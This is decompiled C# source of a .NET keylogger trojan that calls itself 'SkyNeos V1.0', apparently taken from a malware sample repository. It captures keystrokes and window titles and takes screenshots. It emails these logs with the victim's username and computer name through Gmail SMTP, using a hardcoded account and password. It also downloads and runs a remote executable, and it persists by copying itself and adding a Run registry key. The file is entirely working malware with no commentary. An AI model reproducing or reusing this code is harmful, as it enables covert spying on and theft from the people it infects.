// Decompiled with JetBrains decompiler
// Type: LEThjJwJ
// Assembly: server, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CD199AF6-714A-4002-ACEF-1B22892CF632
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan-Spy.MSIL.KeyLogger.aww-f9ea09314b7c8778e89abe01467627e7dcd8c5881ef052db5e22ba9ef11bf552.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

[StandardModule]
internal sealed class LEThjJwJ
{
  public static Mutex dLBfEuNPwTuuGh;
  public static string rjxjVBchppIcvK = "FKrvSGxBA";
  [AccessedThroughProperty("kIsaTynX")]
  private static JFsnADcn _kIsaTynX;
  public static string gGxhXIIv;
  public static string yRLXDeEX;
  public static string vPQWnzcg;
  public static string rfBtxzmo;
  public static Thread mgIEoCOQ;
  public static string xuJnJYDw;
  public static Process stukiwEO;
  [AccessedThroughProperty("EDyaPnzo")]
  private static System.Windows.Forms.Timer _EDyaPnzo;
  private const int msAYJCkE = 7;
  private const int yIcVuCUl = 1;
  private const int omdNielE = 0;
  public static string jxcDcKOc;
  public static string VIWdTJnX;
  public static string uuhcRjjF;
  public static int hPZhzwjN;
  public static int jDKZdzRz;
  public static LEThjJwJ.vaQBJxmE sTIotIDI;
  public static string JTYgQGSy;
  public static bool sszTlWvT;
  public static bool ovERJrct;
  public static bool EvtnLQcV;
  public static string VOwOBwVt;
  public static string PeOZluvJ;
  public static string zvJbKQph;
  public static string yBhUjSkG;
  public static int pjtQnYek;
  public static bool ikJUBDRY;

  static LEThjJwJ()
  {
    LEThjJwJ.kIsaTynX = new JFsnADcn();
    LEThjJwJ.vPQWnzcg = "rVzWJrYnj";
    LEThjJwJ.rfBtxzmo = "UOghDDYNX.exe";
    LEThjJwJ.EDyaPnzo = new System.Windows.Forms.Timer();
    LEThjJwJ.jxcDcKOc = "gia.nebeiridze@gmail.com";
    LEThjJwJ.VIWdTJnX = "stinky_man";
    LEThjJwJ.uuhcRjjF = "smtp.gmail.com";
    LEThjJwJ.hPZhzwjN = 587;
    LEThjJwJ.jDKZdzRz = 15;
    LEThjJwJ.sTIotIDI = (LEThjJwJ.vaQBJxmE) 0;
    LEThjJwJ.JTYgQGSy = "gii";
    LEThjJwJ.sszTlWvT = true;
    LEThjJwJ.ovERJrct = true;
    LEThjJwJ.EvtnLQcV = true;
    LEThjJwJ.VOwOBwVt = "";
    LEThjJwJ.PeOZluvJ = "";
    LEThjJwJ.zvJbKQph = "Title";
    LEThjJwJ.yBhUjSkG = "Message";
    LEThjJwJ.pjtQnYek = 0;
    LEThjJwJ.ikJUBDRY = true;
  }

  public static JFsnADcn kIsaTynX
  {
    get => LEThjJwJ._kIsaTynX;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      JFsnADcn.gTTNCfFJEventHandler cfFjEventHandler = new JFsnADcn.gTTNCfFJEventHandler(LEThjJwJ.fCuNIYXT);
      if (LEThjJwJ._kIsaTynX != null)
        JFsnADcn.gTTNCfFJ -= cfFjEventHandler;
      LEThjJwJ._kIsaTynX = value;
      if (LEThjJwJ._kIsaTynX == null)
        return;
      JFsnADcn.gTTNCfFJ += cfFjEventHandler;
    }
  }

  public static System.Windows.Forms.Timer EDyaPnzo
  {
    get => LEThjJwJ._EDyaPnzo;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(LEThjJwJ.WgTsyZuO);
      if (LEThjJwJ._EDyaPnzo != null)
        LEThjJwJ._EDyaPnzo.Tick -= eventHandler;
      LEThjJwJ._EDyaPnzo = value;
      if (LEThjJwJ._EDyaPnzo == null)
        return;
      LEThjJwJ._EDyaPnzo.Tick += eventHandler;
    }
  }

  [DllImport("kernel32.dll", EntryPoint = "GetConsoleWindow", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern IntPtr LCEyJcnQ();

  [DllImport("user32.dll", EntryPoint = "ShowWindow", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int skyYpCyb(IntPtr gAJgPgye, int kGjdmflr);

  [DllImport("user32.dll", EntryPoint = "GetForegroundWindow", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int CEcSDPKN();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int lQvLavEF(int gAJgPgye, [MarshalAs(UnmanagedType.VBByRefStr)] ref string EvQdUmPZ, int zjhoEdTz);

  private static string AmaPJUJp()
  {
    string EvQdUmPZ = new string(char.MinValue, 100);
    LEThjJwJ.lQvLavEF(LEThjJwJ.CEcSDPKN(), ref EvQdUmPZ, 100);
    return EvQdUmPZ.Substring(0, checked (Strings.InStr(EvQdUmPZ, "\0") - 1));
  }

  public static void iuprKERd(string nJJcXJyI, string KwvchNGL)
  {
    RegistryKey subKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    subKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
    subKey.SetValue(nJJcXJyI, (object) KwvchNGL);
  }

  public static void luatbVEQ(string nJJcXJyI)
  {
    RegistryKey subKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    subKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
    subKey.DeleteValue(nJJcXJyI, false);
  }

  public static void BdxchQoW(string BRXObLtJ)
  {
    try
    {
      Mutex.OpenExisting(BRXObLtJ);
      ProjectData.EndApp();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      LEThjJwJ.dLBfEuNPwTuuGh = new Mutex(false, BRXObLtJ);
      ProjectData.ClearProjectError();
    }
  }

  public static string JGkBFPXA(int viVGLcwp, int pQcuhISQ)
  {
    Random random = new Random();
    string str1 = (string) null;
    string str2 = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPLKHJJGFDSAZXCVBNM";
    int num1 = random.Next(checked (viVGLcwp + 1), pQcuhISQ);
    int num2 = 1;
    while (num2 <= num1)
    {
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (str2.Length - 2) * VBMath.Rnd()) + 1f)));
      str1 += Conversions.ToString(str2[index]);
      checked { ++num2; }
    }
    return str1;
  }

  private static void fCuNIYXT(string fStbJfxc)
  {
    if (Operators.CompareString(LEThjJwJ.yRLXDeEX, LEThjJwJ.AmaPJUJp(), false) != 0)
    {
      LEThjJwJ.gGxhXIIv = LEThjJwJ.gGxhXIIv + "\r\n[TITLE: " + LEThjJwJ.AmaPJUJp() + "]:\r\n";
      LEThjJwJ.yRLXDeEX = LEThjJwJ.AmaPJUJp();
      Console.WriteLine("\r\n[TITLE: " + LEThjJwJ.AmaPJUJp() + "]:");
    }
    LEThjJwJ.gGxhXIIv += fStbJfxc;
    Console.Write(fStbJfxc);
  }

  private static void WgTsyZuO(object ZdVSbQJD, EventArgs xakvoUus)
  {
    Console.WriteLine("A new log is sending...");
    new Thread((ParameterizedThreadStart) (a0 => LEThjJwJ.JZFauwox(Conversions.ToString(a0))))
    {
      IsBackground = true
    }.Start((object) LEThjJwJ.gGxhXIIv);
    LEThjJwJ.gGxhXIIv = "";
  }

  private static void JZFauwox(string aBATHoge)
  {
label_0:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      string str = Path.GetTempPath() + "\\" + LEThjJwJ.JGkBFPXA(5, 10) + ".png";
label_2:
      num3 = 3;
      if (!LEThjJwJ.sszTlWvT)
        goto label_7;
label_3:
      num3 = 4;
      urEVdlZmdSt.bDDtTQGvBoP();
label_4:
      num3 = 5;
      if (!System.IO.File.Exists(str))
        goto label_6;
label_5:
      num3 = 6;
      System.IO.File.Delete(str);
label_6:
      num3 = 8;
      urEVdlZmdSt.phJSglASvYa.Save(str, ImageFormat.Png);
label_7:
      num3 = 10;
      MailMessage message = new MailMessage();
label_8:
      num3 = 11;
      SmtpClient smtpClient1 = new SmtpClient(LEThjJwJ.uuhcRjjF);
label_9:
      num3 = 12;
      SmtpClient smtpClient2 = smtpClient1;
label_10:
      num3 = 13;
      smtpClient2.EnableSsl = true;
label_11:
      num3 = 14;
      smtpClient2.Credentials = (ICredentialsByHost) new NetworkCredential(LEThjJwJ.jxcDcKOc, LEThjJwJ.VIWdTJnX);
label_12:
      num3 = 15;
      smtpClient2.Port = LEThjJwJ.hPZhzwjN;
label_13:
      smtpClient2 = (SmtpClient) null;
label_14:
      num3 = 17;
      MailMessage mailMessage = message;
label_15:
      num3 = 18;
      mailMessage.To.Add(LEThjJwJ.jxcDcKOc);
label_16:
      num3 = 19;
      mailMessage.From = new MailAddress(LEThjJwJ.jxcDcKOc);
label_17:
      num3 = 20;
      mailMessage.Subject = LEThjJwJ.JTYgQGSy;
label_18:
      num3 = 21;
      mailMessage.Body = aBATHoge;
label_19:
      num3 = 22;
      if (!LEThjJwJ.sszTlWvT)
        goto label_21;
label_20:
      num3 = 23;
      mailMessage.Attachments.Add(new Attachment(str));
label_21:
      num3 = 25;
      if (!LEThjJwJ.EvtnLQcV)
        goto label_23;
label_22:
      num3 = 26;
      mailMessage.Body = "Victim Username: " + LEThjJwJ.NYEUyahw().ToString() + "\r\n" + mailMessage.Body;
label_23:
      num3 = 28;
      if (!LEThjJwJ.ovERJrct)
        goto label_25;
label_24:
      num3 = 29;
      mailMessage.Body = "Victim Computer Name: " + MyProject.Computer.Name + "\r\n" + mailMessage.Body;
label_25:
      mailMessage = (MailMessage) null;
label_26:
      num3 = 32;
      smtpClient1.Send(message);
label_27:
      num3 = 33;
      Console.WriteLine("##### Logs have been sent! #####");
      goto label_34;
label_29:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
              goto label_5;
            case 7:
            case 8:
              goto label_6;
            case 9:
            case 10:
              goto label_7;
            case 11:
              goto label_8;
            case 12:
              goto label_9;
            case 13:
              goto label_10;
            case 14:
              goto label_11;
            case 15:
              goto label_12;
            case 16:
              goto label_13;
            case 17:
              goto label_14;
            case 18:
              goto label_15;
            case 19:
              goto label_16;
            case 20:
              goto label_17;
            case 21:
              goto label_18;
            case 22:
              goto label_19;
            case 23:
              goto label_20;
            case 24:
            case 25:
              goto label_21;
            case 26:
              goto label_22;
            case 27:
            case 28:
              goto label_23;
            case 29:
              goto label_24;
            case 30:
            case 31:
              goto label_25;
            case 32:
              goto label_26;
            case 33:
              goto label_27;
            case 34:
              goto label_34;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_29;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_34:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private static void jYWYkXJT()
  {
label_0:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      WebClient webClient = new WebClient();
label_2:
      num3 = 3;
      Uri address = new Uri(LEThjJwJ.VOwOBwVt);
label_3:
      num3 = 4;
      LEThjJwJ.xuJnJYDw = Path.GetTempPath() + "\\" + LEThjJwJ.JGkBFPXA(5, 10) + ".exe";
label_4:
      num3 = 5;
      webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(LEThjJwJ.hTFrrRkv);
label_5:
      num3 = 6;
      webClient.DownloadFileAsync(address, LEThjJwJ.xuJnJYDw);
      goto label_12;
label_7:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
              goto label_5;
            case 7:
              goto label_12;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_7;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_12:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private static void hTFrrRkv(object ZdVSbQJD, AsyncCompletedEventArgs xakvoUus)
  {
label_0:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      Process process = new Process();
label_2:
      num3 = 3;
      ProcessStartInfo processStartInfo = process.StartInfo;
label_3:
      num3 = 4;
      processStartInfo.FileName = LEThjJwJ.xuJnJYDw;
label_4:
      num3 = 5;
      processStartInfo.UseShellExecute = true;
label_5:
      processStartInfo = (ProcessStartInfo) null;
label_6:
      num3 = 7;
      process.Start();
      goto label_13;
label_8:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
              goto label_5;
            case 7:
              goto label_6;
            case 8:
              goto label_13;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_8;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_13:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private static string NYEUyahw()
  {
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
    string str = folderPath.Remove(folderPath.LastIndexOf("\\"));
    return str.Substring(checked (str.LastIndexOf("\\") + 1));
  }

  [STAThread]
  public static void Main()
  {
label_0:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      LEThjJwJ.BdxchQoW(LEThjJwJ.rjxjVBchppIcvK);
label_2:
      num3 = 3;
      System.Windows.Forms.Timer timer = LEThjJwJ.EDyaPnzo;
label_3:
      num3 = 4;
      timer.Interval = checked (LEThjJwJ.jDKZdzRz * int.Parse(Conversions.ToString(unchecked ((int) LEThjJwJ.sTIotIDI))));
label_4:
      num3 = 5;
      timer.Start();
label_5:
      timer = (System.Windows.Forms.Timer) null;
label_6:
      num3 = 7;
      LEThjJwJ.mgIEoCOQ = new Thread(new ThreadStart(LEThjJwJ.jYWYkXJT));
label_7:
      num3 = 8;
      Thread thread = LEThjJwJ.mgIEoCOQ;
label_8:
      num3 = 9;
      thread.IsBackground = true;
label_9:
      num3 = 10;
      thread.Start();
label_10:
      thread = (Thread) null;
label_11:
      num3 = 12;
      LEThjJwJ.stukiwEO = new Process();
label_12:
      num3 = 13;
      Process process = LEThjJwJ.stukiwEO;
label_13:
      num3 = 14;
      process.StartInfo.FileName = LEThjJwJ.PeOZluvJ;
label_14:
      num3 = 15;
      process.StartInfo.UseShellExecute = true;
label_15:
      num3 = 16;
      process.Start();
label_16:
      process = (Process) null;
label_17:
      num3 = 18;
      if (!LEThjJwJ.ikJUBDRY)
        goto label_19;
label_18:
      num3 = 19;
      int num4 = (int) Interaction.MsgBox((object) LEThjJwJ.yBhUjSkG, (MsgBoxStyle) LEThjJwJ.pjtQnYek, (object) LEThjJwJ.zvJbKQph);
label_19:
      num3 = 21;
      Console.WriteLine("SkyNeos V1.0 Keylogger Engine Started Successfully!");
label_20:
      num3 = 22;
      string str = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
label_21:
      num3 = 23;
      MyProject.Computer.FileSystem.CreateDirectory(str + "\\" + LEThjJwJ.vPQWnzcg);
label_22:
      num3 = 24;
      str = str + "\\" + LEThjJwJ.vPQWnzcg + "\\" + LEThjJwJ.rfBtxzmo;
label_23:
      num3 = 25;
      MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, str, true);
label_24:
      num3 = 26;
      LEThjJwJ.iuprKERd(LEThjJwJ.vPQWnzcg, str);
label_25:
      num3 = 27;
      LEThjJwJ.kIsaTynX.PcxsAocU();
label_26:
      num3 = 28;
      Application.Run();
      goto label_33;
label_28:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num5 = num2 + 1;
          num2 = 0;
          switch (num5)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
              goto label_5;
            case 7:
              goto label_6;
            case 8:
              goto label_7;
            case 9:
              goto label_8;
            case 10:
              goto label_9;
            case 11:
              goto label_10;
            case 12:
              goto label_11;
            case 13:
              goto label_12;
            case 14:
              goto label_13;
            case 15:
              goto label_14;
            case 16:
              goto label_15;
            case 17:
              goto label_16;
            case 18:
              goto label_17;
            case 19:
              goto label_18;
            case 20:
            case 21:
              goto label_19;
            case 22:
              goto label_20;
            case 23:
              goto label_21;
            case 24:
              goto label_22;
            case 25:
              goto label_23;
            case 26:
              goto label_24;
            case 27:
              goto label_25;
            case 28:
              goto label_26;
            case 29:
              goto label_33;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_28;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_33:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  public enum vaQBJxmE
  {
    aXkYYJKL = 1,
    JgRQRhvl = 1000, // 0x000003E8
    BWTnexoO = 60000, // 0x0000EA60
    osxyULbv = 3600000, // 0x0036EE80
  }
}
